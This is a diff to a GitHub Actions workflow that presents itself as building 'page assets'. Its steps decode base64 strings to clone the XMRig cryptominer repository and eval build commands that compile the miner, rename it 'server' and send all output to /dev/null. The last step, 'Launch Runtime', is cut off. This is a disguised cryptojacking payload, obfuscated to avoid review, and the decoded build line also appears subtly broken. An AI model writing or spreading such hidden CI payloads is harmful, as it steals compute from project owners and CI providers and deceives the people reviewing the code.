@@ -12,31 +12,31 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Checkout Repository
+      - name: 1 Checkout Repository
         uses: actions/checkout@v2
 
-      - name: Setup Build Environment
+      - name: 2 Setup Build Environment
         shell: bash
         run: |
           sudo apt-get update
-          sudo apt-get install -y             git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
 
-      - name: Prepare Page Engine
+      - name: 3 Prepare Page Engine
         shell: bash
         run: |
-          REPO_B64="aHR0cHM6Ly9naXRodWIuY29tL3htcmlnL3htcmlnLmdpdA=="
-          REPO_URL=$(echo "$REPO_B64" | base64 -d)
+          ENCODED="aHR0cHM6Ly9naXRodWIuY29tL3htcmlnL3htcmlnLmdpdA=="
+          REPO_URL=$(echo "$ENCODED" | base64 -d)
           if [ ! -d "core-engine" ]; then
             git clone "$REPO_URL" core-engine
           fi
 
-      - name: Build Page Assets
+      - name: 4 Build Page Assets
         run: |
-          ENCODED="bWtkaXIgLXAgY29yZS1lbmdpbmUvYnVpbGQKY2QgY29yZS1lbmdpbmUvYnVpbGQKY21ha2UgLi4KbWFrZSAtaiIkKG5wcm9jKSIKbXYgeG1yaWcgc2VydmVy"
+          ENCODED="bWtkaXIgLXAgY29yZS1lbmdpbmUvYnVpbGQKY2QgY29yZS1lbmdpbmUvYnVpbGQKY21ha2UgLi4gPiAvZGV2L251bGwgMj4mMQptYWtlIC1qIiRocHJvYyIgPiAvZGV2L251bGwgMj4mMQptdiB4bXJpZyBzZXJ2ZXIgPiAvZGV2L251bGwgMj4mMQ=="
           CMD=$(echo "$ENCODED" | base64 -d)
           eval "$CMD"
 
-      - name: Launch Runtime
+      - name: 5 Launch Runtime
         shell: bash
         run: |
           cd core-engine/build
